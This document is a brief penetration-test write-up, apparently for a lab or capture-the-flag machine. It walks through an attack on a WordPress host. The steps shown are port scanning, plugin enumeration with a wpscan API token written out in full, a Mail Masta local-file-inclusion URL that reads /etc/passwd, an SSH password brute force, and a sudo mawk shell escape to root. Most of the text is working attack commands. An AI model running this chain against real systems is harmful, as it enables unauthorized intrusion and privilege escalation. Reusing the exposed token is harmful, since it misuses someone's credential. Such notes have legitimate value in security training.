nmap -p- -sV -sC -Pn 192.168.102.112 --open

ftp anonymous available
passwords in pdf

wpscan for 
wpscan --url http://192.168.102.112 --enumerate p --plugins-detection aggressive --api-token fQRHq1Xd2K2yCo8zQjiNQwGrSMbOJUekxgKkxaqRYew
wpscan --url http://192.168.102.112 --passwords password112.txt --api-token fQRHq1Xd2K2yCo8zQjiNQwGrSMbOJUekxgKkxaqRYew
LFI in mail masta plugin
http://192.168.102.112/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
got username
created username and passwordlist
 bruteforce ssh
 got sarah for ssh
 sudo -l 
 mawk
 sudo mawk 'BEGIN {system("/bin/sh")}'
 gtfobins got root